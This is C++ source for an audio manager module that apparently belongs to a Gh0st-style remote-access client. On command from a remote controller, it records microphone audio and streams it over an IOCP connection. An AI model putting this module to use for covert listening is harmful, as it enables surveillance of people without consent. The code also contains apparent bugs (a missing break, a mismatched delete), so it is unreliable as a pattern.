#include "AudioManager.h"



CAudioManager::CAudioManager(_CIOCPClient * IOCPClient) : CManager(IOCPClient)
{
	printf("CAudioManager()构造调用\r\n");
	m_bIsWorking = FALSE;
	m_AudioObject = NULL;
	m_WorkThreadHandle = NULL;
	if (Initialize() == FALSE)
	{
		return;
	}
	BYTE IsToken = CLIENT_AUDIO_MANAGER_REPLY;
	m_IOCPClient->OnSending((char*)&IsToken,1);
	
	WaittingForDialogOpen(); //等待对话框打开

	m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThreadProdurce,
		(LPVOID)this, 0, NULL);
}


CAudioManager::~CAudioManager()
{
	m_bIsWorking = FALSE;

	WaitForSingleObject(m_WorkThreadHandle, INFINITE);

	if (m_WorkThreadHandle != NULL)
	{
		CloseHandle(m_WorkThreadHandle);
		m_WorkThreadHandle = NULL;
	}

	if (m_AudioObject!=NULL)
	{
		delete m_AudioObject;
		m_AudioObject = NULL;
	}
	printf("~CAudioManager()析构调用\r\n");
}

BOOL CAudioManager::Initialize()
{
	if (!waveInGetNumDevs())
	{
		return FALSE;
	}
	if (m_bIsWorking == TRUE)
	{
		return FALSE;
	}

	m_AudioObject = new CAudio;//功能类对象的申请内存
	m_bIsWorking = TRUE;
	return TRUE;

}

VOID CAudioManager::HandleIO(PBYTE BufferData, ULONG BufferLength)
{
	BYTE IsToken;

	switch (BufferData[0])
	{
	case CLIENT_GO_ON:
	{
		NotifyDialogIsOpen();
	}
	case CLIENT_AUDIO_MANAGER_RECORD_DATA:
	{
		m_bIsWorking = FALSE;
		if (m_WorkThreadHandle != NULL)
		{
			CloseHandle(m_WorkThreadHandle);
			m_WorkThreadHandle = NULL;
		}
		m_AudioObject->ChangeStatus();
		m_AudioObject->PlayRecordData(BufferData + 1, BufferLength - 1);
		break;
	}
	case CLENT_AUDIO_MANAGER_PLAY:
	{
		m_AudioObject->ChangeStatus();
		m_bIsWorking = TRUE;
		m_WorkThreadHandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WorkThreadProdurce, this, 0, NULL);	//创建工作线程
		break;
	}
	}
}

DWORD CAudioManager::WorkThreadProdurce(LPVOID lParam)
{
	CAudioManager *This = (CAudioManager*)lParam;
	while (This->m_bIsWorking)
	{
		This->SendRecordBuffer();
	}
	printf("CAudioManager::WorkThreadProdurce退出线程/r/n");
	return 0;
}

int CAudioManager::SendRecordBuffer()
{
	DWORD BufferLength = 0;
	DWORD ReturnLength = 0;
	//这里得到音频数据
	LPBYTE AudioData = m_AudioObject->GetRecordData(&BufferLength);
	if (AudioData ==NULL)
	{
		return 0;
	}
	//分配缓冲区
	LPBYTE BufferData = new BYTE[BufferLength + 1];
	//加入数据头
	BufferData[0] = CLIENT_AUDIO_MANAGER_RECORD_DATA;
	//复制缓冲区
	memcpy(BufferData + 1, AudioData, BufferLength);
	//发送出去
	if (BufferLength)
	{
		ReturnLength = m_IOCPClient->OnSending((char*)BufferData,BufferLength+1);
	}
	if (BufferData != NULL)
	{
		delete BufferData;
		BufferData = NULL;
	}
	return ReturnLength;
}